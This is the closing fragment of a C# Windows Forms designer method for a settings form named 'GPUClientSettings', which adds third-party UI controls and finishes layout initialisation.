            base.Controls.Add(metroSetRadioButton1);
            base.Controls.Add(metroSetButton1);
            base.Controls.Add(metroSetButton3);
            base.Controls.Add(guna2Panel1);
            base.Controls.Add(guna2GroupBox3);
            ForeColor = System.Drawing.Color.LightGray;
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.Name = "GPUClientSettings";
            Text = "GPUClientSettings";
            guna2Panel1.ResumeLayout(false);
            guna2Panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            ((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
            guna2GroupBox3.ResumeLayout(false);
            guna2GroupBox3.PerformLayout();
            ResumeLayout(false);
            PerformLayout();
        }
    }
}
